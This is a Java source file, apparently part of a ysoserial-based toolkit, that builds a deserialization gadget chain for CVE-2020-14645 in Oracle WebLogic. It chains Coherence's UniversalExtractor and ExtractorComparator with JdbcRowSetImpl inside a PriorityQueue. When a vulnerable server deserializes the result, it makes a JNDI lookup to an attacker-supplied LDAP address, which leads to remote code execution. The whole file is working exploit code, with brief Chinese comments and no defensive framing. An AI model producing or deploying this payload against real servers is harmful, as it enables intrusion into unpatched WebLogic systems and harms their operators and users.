package unserWeblogic.gadgets;

import com.tangosol.util.comparator.ExtractorComparator;

import java.lang.reflect.Method;
import java.util.PriorityQueue;
import com.tangosol.internal.util.invoke.Lambdas;
import ysoserial.payloads.util.Reflections;
import com.sun.rowset.JdbcRowSetImpl;
import com.tangosol.util.extractor.UniversalExtractor;

//command as ldap://ip:port/7buppk
public class CVE_2020_14645 implements ObjectPayload<Object> {
    public Object getObject(final String command) throws Exception {
        // 创建ExtractorComparator实例
        UniversalExtractor extractor = new UniversalExtractor("getDatabaseMetaData()", null, 1);
        final ExtractorComparator comparator = new ExtractorComparator(extractor);
        // 创建JdbcRowSetImpl实例
        JdbcRowSetImpl rowSet = new JdbcRowSetImpl();
        rowSet.setDataSourceName(command);
        // 创建PriorityQueue实例，并使用自定义比较器
        PriorityQueue queue = new PriorityQueue(2, comparator);
        Object[] q = new Object[]{rowSet, rowSet};
        Reflections.setFieldValue(queue, "queue", q);
        Reflections.setFieldValue(queue, "size", 2);
        return queue;
    }
}
